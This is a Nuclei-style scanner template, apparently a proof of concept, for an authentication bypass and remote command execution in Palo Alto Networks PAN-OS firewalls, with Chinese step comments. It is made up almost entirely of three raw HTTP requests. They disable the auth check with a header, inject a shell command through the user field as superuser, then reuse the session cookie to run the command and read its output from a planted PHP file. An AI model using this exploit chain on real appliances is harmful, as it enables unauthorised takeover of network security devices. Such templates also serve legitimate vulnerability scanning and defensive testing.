id: poc-qes7mlliyg9cy10p
info:
  name: Palo Alto Networks PAN-OS身份认证绕过导致RCE漏洞
  author: hacktwo
  severity: high
  description: ''
  tags: rce,unauth,2024
http:
- raw:
  - 'POST /php/utils/createRemoteAppwebSession.php/rce.js.map HTTP/1.1

    Host: {{Hostname}}

    X-PAN-AUTHCHECK: off

    Content-Type: application/x-www-form-urlencoded


    user=`echo $(uname -a) > /var/appweb/htdocs/unauth/rce.php`&userRole=superuser&remoteHost=&vsys=vsys1


    携带cookie权限提升并执行命令'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /index.php/.js.map HTTP/1.1

    Host: {{Hostname}}

    Cookie: 上一步返回的cookie

    X-PAN-AUTHCHECK: off

    Connection: keep-alive


    获取命令执行结果'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
- raw:
  - 'GET /unauth/rce.php HTTP/1.1

    Host: {{Hostname}}

    Cookie: 上一步获取的cookie

    X-PAN-AUTHCHECK: off

    Connection: keep-alive'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
